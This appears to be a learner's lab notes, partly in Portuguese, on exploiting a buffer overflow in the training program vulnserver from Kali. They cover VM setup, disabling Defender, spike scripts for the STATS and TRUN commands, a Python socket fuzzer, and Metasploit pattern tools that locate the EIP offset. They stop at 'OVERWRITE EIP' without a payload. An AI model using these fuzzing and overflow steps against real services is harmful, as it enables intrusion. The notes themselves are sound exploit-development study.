Windows 10 Server VM - file / Host Network Manager / Host-only network Intel PRO 8254 Permitir VMs
Kali NAT Intel PRO 8254 Permitir tudo

thegreycorner.com/vulnserver.html
immunityinc.com/products/debugger

Defender off

vulnserver.exe as admin
Immunity as admin / file /attach vuln server / play / IP win port 9999

https://medium.com/@lonewolf.raj/easy-steps-to-exploit-windows-based-buffer-overflow-vulnserver-ae9ad4b415b6

https://joncraton.org/blog/46/netcat-for-windows/

nc -nv 192.168.44.100 9999 (netcat) -- Kali

generic_send_tcp

SPIKING:
stats.spk:

s_readline();
s_string("STATS ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 

not vulnerable

TRUN SPIKING

s_readline();
s_string("TRUN ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 
send bunch of A's
crash immunity debugger

EBP = 414141 == A A A A (!)
over everything
EIP 414141 -> can inject malicious here

we know TRUN is vulnerable -> FUZZING

fuzz.py
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="A"*50

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.56.101',9999))
		
		s.send(('TRUN /.:/' + buffer))
		sleep(1)
		buffer=buffer + "A"*50
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
    
chmod +x fuzz.py
./fuzz.py
Fuzzing crashed at 15900 bytes

FIND OFFSET

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 17000 (>15900) > offset.txt
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()   
   

└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 17000 -q 386F4337
Exact match at offset 2003

control EIP = 4 bytes

OVERWRITE EIP

